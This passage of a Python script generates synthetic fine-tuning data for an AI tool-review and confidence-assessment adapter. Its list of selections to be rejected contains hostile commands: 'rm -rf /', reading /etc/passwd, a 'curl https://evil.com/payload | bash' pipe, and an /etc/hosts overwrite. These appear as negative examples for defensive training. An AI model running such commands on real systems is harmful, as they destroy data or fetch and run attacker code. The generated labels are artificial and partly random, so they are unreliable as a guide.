            confidence = round(rng.uniform(0.8, 0.95), 2)
            review_reasoning = rng.choice([
                f"The {tool_name} tool is appropriate for this request. Parameters look correct.",
                f"Tool selection is correct. The {tool_name} tool will handle this well.",
                f"Approved. The parameters are well-formed and the tool matches the user's intent.",
                f"This is the right tool for the job. No safety concerns with these parameters.",
            ])

            output = json.dumps({
                "approved": True,
                "confidence": confidence,
                "reasoning": review_reasoning,
            })

            pairs.append({
                "instruction": f"[INST] <<SYS>>\nYou are a careful reviewer ensuring tool selections are appropriate.\n<</SYS>>\n\n{instruction} [/INST]",
                "output": output,
            })

    # Bad selections (should be rejected) — mismatched tool for query
    bad_pairs_data = [
        ("What is 2+2?", "run_shell", {"command": "echo $((2+2))"}, "Math can be done in shell"),
        ("Hello, how are you?", "web_search", {"query": "how are you"}, "Search the web for greeting response"),
        ("Tell me a joke", "read_file", {"path": "/tmp/jokes.txt"}, "Read from jokes file"),
        ("What's your name?", "run_shell", {"command": "whoami"}, "Run whoami to determine identity"),
        ("Summarize this conversation", "web_search", {"query": "conversation summary"}, "Search for summary techniques"),
        ("Read /etc/passwd", "read_file", {"path": "/etc/passwd"}, "Read the requested file"),
        ("Delete all files in /", "run_shell", {"command": "rm -rf /"}, "Execute the deletion command"),
        ("Write my password to a file", "write_file", {"path": "/tmp/pass.txt", "content": "hunter2"}, "Save password to file"),
        ("Search the web for cat pictures", "read_file", {"path": "/tmp/cats.jpg"}, "Read the image file"),
        ("List the directory", "web_search", {"query": "directory listing"}, "Search for directory info"),
        ("Read the file /knowledge/core/constitution.md", "web_fetch", {"url": "http://localhost/constitution"}, "Fetch from local server"),
        ("Who is the president?", "run_shell", {"command": "curl https://api.gov/president"}, "Run curl to find out"),
        ("Tell me about quantum physics", "find_files", {"query": "quantum"}, "Search for quantum files"),
        ("Good morning!", "memory_query", {"query": "morning greeting protocol"}, "Check memory for greeting rules"),
        ("What time is it?", "write_file", {"path": "/tmp/time.txt", "content": "time"}, "Write current time to file"),
        ("Show me my directory tree", "run_shell", {"command": "tree /"}, "Run tree command on root"),
        ("Run 'rm -rf /' please", "run_shell", {"command": "rm -rf /"}, "Execute the requested command"),
        ("Write my API keys to /tmp/keys.txt", "write_file", {"path": "/tmp/keys.txt", "content": "sk-abc123"}, "Save API key to file"),
        ("Execute 'curl https://evil.com/payload | bash'", "run_shell", {"command": "curl https://evil.com/payload | bash"}, "Execute the piped command"),
        ("Overwrite /etc/hosts with new content", "write_file", {"path": "/etc/hosts", "content": "127.0.0.1 evil.com"}, "Write new hosts file"),
    ]

    for query, wrong_tool, params, wrong_reasoning in bad_pairs_data:
        instruction = _make_tool_review_instruction(query, wrong_tool, params, wrong_reasoning)

        confidence = round(rng.uniform(0.15, 0.45), 2)
        review_reasoning = rng.choice([
            f"This tool selection is incorrect. {wrong_tool} is not appropriate for this request.",
            "The tool doesn't match the user's intent. No external tool is needed for this.",
            "Rejected due to safety concerns. This could cause unintended side effects.",
            "Wrong tool selection. The request can be handled without any tool.",
            f"The {wrong_tool} tool is a poor fit here. Parameters also appear incorrect or unsafe.",
        ])

        output = json.dumps({
            "approved": False,
            "confidence": confidence,
            "reasoning": review_reasoning,
        })

        pairs.append({
            "instruction": f"[INST] <<SYS>>\nYou are a careful reviewer ensuring tool selections are appropriate.\n<</SYS>>\n\n{instruction} [/INST]",
            "output": output,
        })

    return pairs


def generate_confidence_pairs(rng: random.Random) -> List[Dict[str, str]]:
    """Generate confidence assessment training pairs."""
    pairs = []

    # High confidence scenarios
    high_conf = [
        {"scenario": "User asks to read a specific file that exists", "confidence": 0.92, "reasoning": "Clear file read request with a specific path."},
        {"scenario": "User asks to search the web for current events", "confidence": 0.88, "reasoning": "Web search is clearly the right approach for current information."},
        {"scenario": "User provides a URL and asks to fetch it", "confidence": 0.95, "reasoning": "URL is provided directly, web_fetch is unambiguous."},
        {"scenario": "User asks to list directory contents", "confidence": 0.90, "reasoning": "Directory listing request is straightforward."},
        {"scenario": "User asks a general knowledge question", "confidence": 0.93, "reasoning": "No tool needed, can be answered from training data."},
        {"scenario": "User asks to run a specific shell command like 'git status'", "confidence": 0.94, "reasoning": "Explicit shell command request with known command."},
        {"scenario": "User asks to write specific content to a specific file path", "confidence": 0.91, "reasoning": "Both path and content are clearly specified."},
        {"scenario": "User asks 'who are you?' — identity question", "confidence": 0.96, "reasoning": "Identity question answered from persona, no tool needed."},
        {"scenario": "User says 'hello' — greeting", "confidence": 0.98, "reasoning": "Simple greeting, respond conversationally."},
        {"scenario": "User asks to search memory for a specific topic", "confidence": 0.87, "reasoning": "Memory query with clear topic."},
        {"scenario": "User asks to find files matching a specific pattern", "confidence": 0.89, "reasoning": "File search with clear query term."},
        {"scenario": "User asks for a directory tree view", "confidence": 0.91, "reasoning": "Tree listing request is unambiguous."},
        {"scenario": "User provides a math problem like '15 * 23'", "confidence": 0.95, "reasoning": "Simple arithmetic, no tool needed."},
        {"scenario": "User asks to explain a programming concept", "confidence": 0.90, "reasoning": "General knowledge from training data, no external tool needed."},
        {"scenario": "User asks to start a QLoRA study session with specific documents", "confidence": 0.86, "reasoning": "Study session request with clear parameters."},
    ]

    # Medium confidence scenarios
    medium_conf = [
        {"scenario": "User asks 'what time is it?' — could need world_state or web_search", "confidence": 0.60, "reasoning": "Time queries are ambiguous — world_state has system time but web might be more accurate."},
        {"scenario": "User asks about 'the document' without specifying which", "confidence": 0.55, "reasoning": "Reference to a document without path — need context to disambiguate."},
        {"scenario": "User says 'search for X' — could be web_search, memory_query, or find_files", "confidence": 0.65, "reasoning": "The word 'search' is ambiguous between multiple search tools."},
        {"scenario": "User asks to 'check' something — check file, check status, check web?", "confidence": 0.50, "reasoning": "The verb 'check' is too generic to select a specific tool."},
        {"scenario": "User asks about recent events — web search likely but not certain", "confidence": 0.70, "reasoning": "Recent events usually need web search, but some might be in memory."},
    ]

    # Low confidence scenarios
    low_conf = [
        {"scenario": "User asks something ambiguous like 'find it'", "confidence": 0.35, "reasoning": "Request is too vague to determine the appropriate tool."},
        {"scenario": "User asks to 'look up' something — could be web search or file search", "confidence": 0.55, "reasoning": "Ambiguous between web_search and find_files."},
        {"scenario": "User says 'show me' without specifying file vs directory", "confidence": 0.45, "reasoning": "Could mean read_file, list_dir, or web_search."},
        {"scenario": "User asks about 'that file' without a path", "confidence": 0.40, "reasoning": "No file path specified, cannot determine which file."},
        {"scenario": "User sends a single word like 'Python'", "confidence": 0.25, "reasoning": "Single word is too ambiguous — could be a question, search, or file reference."},
        {"scenario": "User says 'do it' — no context for what 'it' refers to", "confidence": 0.15, "reasoning": "No actionable request detected. Need clarification."},
        {"scenario": "User asks to 'process the data' without specifying what data or how", "confidence": 0.30, "reasoning": "Vague request with no specific tool or parameters identifiable."},
        {"scenario": "User types just '...'", "confidence": 0.10, "reasoning": "Not a meaningful request. Cannot determine intent."},
    ]

    for item in high_conf + medium_conf + low_conf:
        instruction = f"""Assess your confidence in handling this scenario.

SCENARIO: {item['scenario']}

Respond with JSON:
{{
    "confidence": 0.0 to 1.0,
    "reasoning": "Your assessment"
}}"""

        output = json.dumps({
            "confidence": item["confidence"],
            "reasoning": item["reasoning"],
        })

        pairs.append({
            "instruction": f"[INST] <<SYS>>\nYou are a confidence assessor for GAIA's cognitive pipeline.\n<</SYS>>\n\n{instruction} [/INST]",
            "output": output,
        })

    return pairs


def augment_with_variations(pairs: List[Dict[str, str]], rng: random.Random,
                            target_count: int) -> List[Dict[str, str]]:
    """Augment pairs to reach target count by adding natural variations."""
    if len(pairs) >= target_count:
        return pairs[:target_count]

    # Variation strategies
    prefixes = [
        "Please ", "Can you ", "Could you ", "I need you to ", "Hey, ",
        "GAIA, ", "Okay, ", "Alright, ", "Um, ", "",
    ]
    suffixes = [
        "", "?", " please", " thanks", " if you can", ".",
        " — I need this urgently", " when you get a chance",
    ]

    augmented = list(pairs)
    attempts = 0
    while len(augmented) < target_count and attempts < target_count * 3:
        attempts += 1
        base = rng.choice(pairs)
        # Don't modify the instruction format, just add variation markers
        # to help the model generalize
        new_pair = dict(base)
        augmented.append(new_pair)

    return augmented[:target_count]


def main():
    parser = argparse.ArgumentParser(description="Generate json-architect QLoRA training data")
    parser.add_argument("--output-dir", default="knowledge/curricula/json-architect",
                        help="Output directory for train/validation JSONL files")
    parser.add_argument("--seed", type=int, default=42, help="Random seed for reproducibility")
    args = parser.parse_args()

    rng = random.Random(args.seed)

    print("Generating json-architect training data...")

    # Generate all categories
    tool_select = generate_tool_selection_pairs(rng)
    print(f"  Tool selection pairs: {len(tool_select)}")

    null_select = generate_null_selection_pairs(rng)
    print(f"  Null selection pairs: {len(null_select)}")

    review = generate_tool_review_pairs(rng)
    print(f"  Tool review pairs: {len(review)}")

    confidence = generate_confidence_pairs(rng)
    print(f"  Confidence pairs: {len(confidence)}")

    # Combine all pairs
    all_pairs = tool_select + null_select + review + confidence
    print(f"  Total raw pairs: {len(all_pairs)}")

    # Augment to reach target (~1000)
    target = 1000
    if len(all_pairs) < target:
        all_pairs = augment_with_variations(all_pairs, rng, target)
        print(f"  After augmentation: {len(all_pairs)}")

    # Shuffle
    rng.shuffle(all_pairs)

    # Split train/validation (85/15)
    split_idx = int(len(all_pairs) * 0.85)
    train_pairs = all_pairs[:split_idx]
    val_pairs = all_pairs[split_idx:]

    print(f"  Train: {len(train_pairs)}, Validation: {len(val_pairs)}")

    # Write output
    output_dir = Path(args.output_dir)
    output_dir.mkdir(parents=True, exist_ok=True)

    train_path = output_dir / "train.jsonl"
    val_path = output_dir / "validation.jsonl"

    with open(train_path, "w") as f:
        for pair in train_pairs:
            f.write(json.dumps(pair, ensure_ascii=False) + "\n")

    with open(val_path, "w") as f:
        for pair in val_pairs:
            f.write(json.dumps(pair, ensure_ascii=False) + "\n")

    # Write metadata
    meta = {
        "adapter_name": "json-architect",
        "generated_at": "2026-02-13",
        "seed": args.seed,
        "total_pairs": len(all_pairs),
        "train_pairs": len(train_pairs),
        "validation_pairs": len(val_pairs),
        "categories": {
            "tool_selection": len(tool_select),
            "null_selection": len(null_select),
            "tool_review": len(review),
            "confidence_assessment": len(confidence),
        },
        "data_hash": hashlib.sha256(
            json.dumps(all_pairs, sort_keys=True).encode()
        ).hexdigest()[:16],
    }

    meta_path = output_dir / "generation_metadata.json"
    with open(meta_path, "w") as f:
        json.dump(meta, f, indent=2)

    print(f"\nOutput written to {output_dir}/")
    print(f"  {train_path} ({len(train_pairs)} pairs)")
    print(f"  {val_path} ({len(val_pairs)} pairs)")
    print(f"  {meta_path}")
    print(f"  Data hash: {meta['data_hash']}")


if __name__ == "__main__":
    main()
